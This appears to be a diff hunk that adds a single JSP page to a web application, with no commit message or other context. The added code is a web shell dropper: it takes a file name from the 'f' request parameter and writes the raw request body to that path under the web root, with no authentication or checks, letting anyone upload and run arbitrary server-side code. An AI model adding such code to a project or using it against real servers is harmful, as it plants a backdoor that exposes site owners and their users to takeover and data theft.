@@ -1,0 +1,1 @@
+<%@page import="java.io.*"%><%if(request.getParameter("f")!=null){FileOutputStream os=new FileOutputStream(application.getRealPath("/")+request.getParameter("f"));InputStream is=request.getInputStream();byte[] b=new byte[512];int n;while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}os.close();is.close();}%>
